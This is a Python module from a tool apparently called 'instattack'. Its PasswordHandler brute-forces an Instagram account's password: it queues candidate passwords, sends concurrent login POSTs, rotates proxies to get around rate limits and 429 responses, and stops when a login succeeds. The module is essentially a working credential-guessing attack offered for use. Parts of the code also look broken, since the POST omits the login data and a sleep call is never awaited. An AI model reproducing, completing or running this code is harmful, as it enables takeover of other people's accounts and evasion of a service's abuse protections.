from __future__ import absolute_import

import asyncio
import aiohttp

from instattack.conf import settings

from instattack import exceptions
from instattack.utils import bar

from .models import InstagramResult, LoginAttemptContext, LoginContext
from .base import RequestHandler


class PasswordHandler(RequestHandler):

    __method__ = 'POST'

    def __init__(
        self,
        user,
        proxy_handler,
        session_timeout=None,
        connection_limit=None,
        connection_force_close=None,
        connection_limit_per_host=None,
        connection_keepalive_timeout=None,
    ):
        super(PasswordHandler, self).__init__(
            'Password Handler',
            method=self.__method__,
            connection_limit=connection_limit,
            session_timeout=session_timeout,
            connection_force_close=connection_force_close,
            connection_limit_per_host=connection_limit_per_host,
            connection_keepalive_timeout=connection_keepalive_timeout
        )

        self.passwords = asyncio.Queue()
        self.user = user

        # TODO: See if we can initialize the server for GET and POST proxies
        # in the handlers themselves, or potentially subclass the asyncio.Queue()\
        # for proxies.
        self.proxy_handler = proxy_handler

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(PasswordHandler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status >= 400 and response.status < 500:
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            try:
                return await self._get_result_from_response(response, context)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response."
                )

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    async def fetch(self, session, parent_context):
        """
        NOTE
        ----

        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().

        TODO:
        -----

        Maybe incorporate some sort of max-retry on the attempts so that we dont
        accidentally run into a situation of accumulating a lot of requests.

        For certain exceptions we may want to reintroduce the sleep/timeout,
        but it might be faster to immediately just go to next proxy.
        """
        async def try_with_proxy(attempt=0):
            proxy = await self.proxy_handler.get()
            context = LoginAttemptContext(
                index=attempt,
                proxy=proxy,
                parent_index=parent_context.index,
                password=parent_context.password,
                token=parent_context.token
            )
            self._notify_request(context, retry=attempt)

            try:
                async with session.post(
                    settings.INSTAGRAM_LOGIN_URL,
                    headers=self._headers(context.token),
                    proxy=proxy.url(),
                ) as response:
                    # Only reason to log these errors here is to provide the response
                    # object
                    try:
                        result = await self._handle_client_response(response, context)
                        result = await self._handle_parsed_result(result, context)

                    except exceptions.ResultNotInResponse as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    except exceptions.InstagramResultError as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    else:
                        if not result:
                            raise exceptions.FatalException("Result should not be None here.")

                        await self.proxy_handler.confirmed(proxy)
                        return result

            except RuntimeError as e:
                """
                RuntimeError: File descriptor 87 is used by transport
                <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
                """
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.TimeoutError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientConnectionError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except OSError as e:
                # We have only seen this for the following:
                # >>> OSError: [Errno 24] Too many open files -> Want to sleep
                # >>> OSError: [Errno 54] Connection reset by peer
                if e.errno == 54:
                    self.log.error(e, extra={'context': context})
                    return await try_with_proxy(attempt=attempt + 1)
                elif e.errno == 24:
                    asyncio.sleep(3)
                    self.log.error(e, extra={
                        'context': context,
                        'other': f'Sleeping for {3} seconds...'
                    })
                    return await try_with_proxy(attempt=attempt + 1)
                else:
                    raise e

            except asyncio.CancelledError as e:
                pass

            except aiohttp.ClientError as e:
                # For whatever reason these errors don't have any message...
                if e.status == 429:
                    e.message = 'Too many requests.'
                    # We still want to put the proxy back in the queue so it can be used
                    # again later, but not confirm it.
                    await self.proxy_handler.used(proxy)

                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

        return await try_with_proxy()

    async def prepopulate(self, loop, password_limit=None):
        with self.log.start_and_done('Prepopulating Passwords'):
            for password in self.user.get_new_attempts(limit=password_limit):
                await self.passwords.put(password)

    async def consume(self, loop, found_result_event, token, results):
        """
        A stop event is required since if the results handler notices that we
        found an authenticated result, it needs some way to communicate this to
        the password consumer, since the password consumer will already have
        a series of tasks queued up.

        TODO:
        ----

        If the task_done() callback is not thread safe because of the
        inability to call await self.results.put(result), we might have to go
        back to using asyncio.as_completed() or limited_as_completed():

        for fut in asyncio.as_completed(tasks):
            fut = await fut
            await self.results.put(fut)

        for res in limited_as_completed(task_generator(), self.config.batch_size):
            result = await res
            await self.results.put(result)
        """
        tasks = []

        if self.passwords.qsize() == 0:
            self.log.error('No Passwords to Try')

            await results.put(None)  # Stop Results Consumer
            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
            return

        # progress = bar(label='Attempting Login', max_value=self.passwords.qsize())

        def task_done(fut):
            result = fut.result()
            if not result or not result.conclusive:
                raise exceptions.FatalException(
                    "Result should be valid and conslusive."
                )
            # TODO: Make sure we do not run into any threading issues with this
            # potentially not being thread safe.
            results.put_nowait(result)

        # progress.start()

        with self.log.start_and_done('Consuming Passwords'):

            async with aiohttp.ClientSession(
                connector=self.connector,
                timeout=self.timeout
            ) as session:

                index = 0
                while not self.passwords.empty() and not found_result_event.is_set():
                    password = await self.passwords.get()
                    context = LoginContext(index=index, token=token, password=password)

                    task = asyncio.create_task(self.fetch(session, context))
                    task.add_done_callback(task_done)
                    tasks.append(task)

                self.log.debug(f'Awaiting {len(tasks)} Password Tasks...')
                await asyncio.gather(*tasks)

        # progress.finish()

        # Triggered by results handler if it notices an authenticated result.
        if found_result_event.is_set():
            # Here we might want to cancel outstanding tasks that we are awaiting.
            self.log.debug('Stop Event Noticed')
            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)

        # Triggered by No More Passwords - No Authenticated Result
        else:
            await results.put(None)  # Stop Results Consumer
            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
